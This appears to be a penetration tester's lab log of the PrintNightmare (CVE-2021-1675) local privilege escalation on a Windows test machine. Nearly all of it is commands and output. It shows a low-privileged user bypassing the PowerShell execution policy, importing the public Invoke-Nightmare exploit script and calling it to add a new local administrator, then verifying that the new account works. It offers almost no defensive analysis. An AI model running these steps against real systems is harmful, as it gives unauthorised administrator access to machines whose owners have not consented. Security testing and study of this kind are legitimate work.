========================================================================================================================
Local Privilege Escalation - PrintNightmare (CVE-2021-1675)
========================================================================================================================


========================================================================================================================
1. Test of the 'PrintNightmare' local privilege escalation vulnerability using the PowerShell exploit 'Invoke-Nightmare' 
========================================================================================================================

Link: https://github.com/calebstewart/CVE-2021-1675/
      The PowerShell script 'CVE-2021-1675.ps1' performs a local privilege escalation (LPE) with the PrintNightmare attack technique.

------------------------------------------------------
Step 1 - Start a CMD shell as a low-privileged user
------------------------------------------------------

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\backup>whoami
WIN-Test-Laptop\backup

C:\Users\backup>whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\backup>net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
Members
-------------------------------------------------------------------------------
Administrator
The command completed successfully.


-----------------------------------------------------------------------------------------------------------------
Step 2 - Start powershell, import the module 'CVE-2021-1475.ps1' and privesc using the command 'Invoke-Nightmare' 
-----------------------------------------------------------------------------------------------------------------

C:\Users\backup>powershell -exec bypass
Windows PowerShell
Copyright (C) 2014 Microsoft Corporation. All rights reserved.

PS C:\Users\backup> cd .\Documents\printnightmare

PS C:\Users\backup\Documents\printnightmare> Import-Module .\CVE-2021-1675.ps1

PS C:\Users\backup\Documents\printnightmare> Get-Module
ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Script     0.0        CVE-2021-1675
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add...

PS C:\Users\backup\Documents\printnightmare> Invoke-Nightmare -DriverName "Audit" -NewUser "pentester" -NewPassword "Password123"
[+] created payload at C:\Users\backup\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_c7ecf3157a0d5bde\Amd64\mxdwdrv.dll"
[+] added user pentester as local administrator
[+] deleting payload from C:\Users\backup\AppData\Local\Temp\1\nightmare.dll

PS C:\Users\backup\Documents\printnightmare> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
Members
-------------------------------------------------------------------------------
Administrator
pentester
The command completed successfully.

PS C:\Users\backup\Documents\printnightmare>


=> The local privesc worked fine and the malicious DLL created during the exploitation has been deleted. 

PS C:\Users\backup\Documents\printnightmare> dir C:\Users\backup\AppData\Local\Temp\1\

    Directory: C:\Users\backup\AppData\Local\Temp\1

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----          8/8/2021   6:26 PM            Low
-a---          8/8/2021   7:00 PM          0 ~DF0F982C71EBDAB265.TMP
-a---          8/8/2021   6:47 PM          0 ~DF289BBDC03C474BC4.TMP
-a---          8/8/2021   6:38 PM          0 ~DF2DC5EAD210AC16CD.TMP
-a---          8/8/2021   6:47 PM          0 ~DFACA7AAE371FFB0CB.TMP
-a---          8/8/2021   6:48 PM          0 ~DFBB0C0DB742A9F67D.TMP
-a---          8/8/2021   6:26 PM          0 ~DFC20EA6EC40D41A7C.TMP


=> We test our new user 'pentester'

PS C:\Users\backup\Documents\printnightmare> runas /noprofile /user:pentester cmd
Enter the password for pentester:
Attempting to start cmd as user "WIN-Test-Laptop\pentester" ...

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
WIN-Test-Laptop\pentester
